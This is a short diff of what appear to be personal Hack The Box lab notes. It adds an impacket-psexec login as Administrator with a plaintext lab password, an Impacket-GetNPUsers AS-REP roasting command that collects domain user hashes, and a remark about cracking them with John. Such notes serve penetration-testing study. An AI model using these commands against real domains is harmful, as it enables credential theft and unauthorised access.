@@ -37,4 +37,6 @@ Following command can be use to logib with username and pasword
 impacket-psexec active.htb/Administrator:Ticketmaster1968@active.htb
 
 Following command can be use to get the hash of users ( AS-REP Roasting attack: Forest Machine )
+Impacket-GetNPUsers htb.local/ -usersfile domain-users.txt -outputfile hashes-domain-users.txt -dc-ip 10.XX.XX.XX
 
+We can crack the hash which we got from above command through john
